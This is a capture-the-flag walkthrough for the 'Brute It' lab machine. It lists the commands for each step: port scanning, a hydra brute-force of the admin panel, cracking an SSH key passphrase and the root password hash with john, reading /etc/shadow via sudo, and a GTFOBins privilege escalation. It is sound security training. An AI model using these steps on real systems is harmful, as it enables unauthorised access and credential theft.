# Brute It

- Deploy the machine

	  no answer needed

- How many ports are open?

	- `nmap -p- <TARGET_IP>` or
	- `scilla port -target <TARGET_IP>`
	- `2`

- What version of SSH is running?

	- `nmap -sS -sV -Pn -p 22 <TARGET_IP>`
	- `OpenSSH 7.6p1`

- What version of Apache is running?

	- `nmap -sS -sV -Pn -p 80 <TARGET_IP>`
	- `2.*.**`

- Which Linux distribution is running?

	- `Ubuntu`

- What is the hidden directory?

	- `scilla dir -target <TARGET_IP>`
	- `/admin`

- What is the user:password of the admin panel?

	- `hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -f`
	- `admin:******`

- What is John's RSA Private Key passphrase?

	- `python2 /usr/share/john/ssh2john.py  rsa_priv > hash`
	- `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
	- `**********`

- user.txt

	- `chmod 400 hash`
	- `ssh john@<TARGET_IP> -i rsa_priv and enter the passphrase`
	- `cat user.txt`
	- `THM{***************************}`

- Web flag

	- `THM{********************}`

- What is the root's password?

	- `sudo cat /etc/shadow`
	- `sudo cat /etc/passwd`
	- Copy these two files into your machine
	- `unshadow passwd shadow > passwords.txt`
	- `john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt`
	- `*********`

- root.txt

	- `sudo -l`
	- https://gtfobins.github.io/gtfobins/cat/
	- `sudo cat /root/` :)


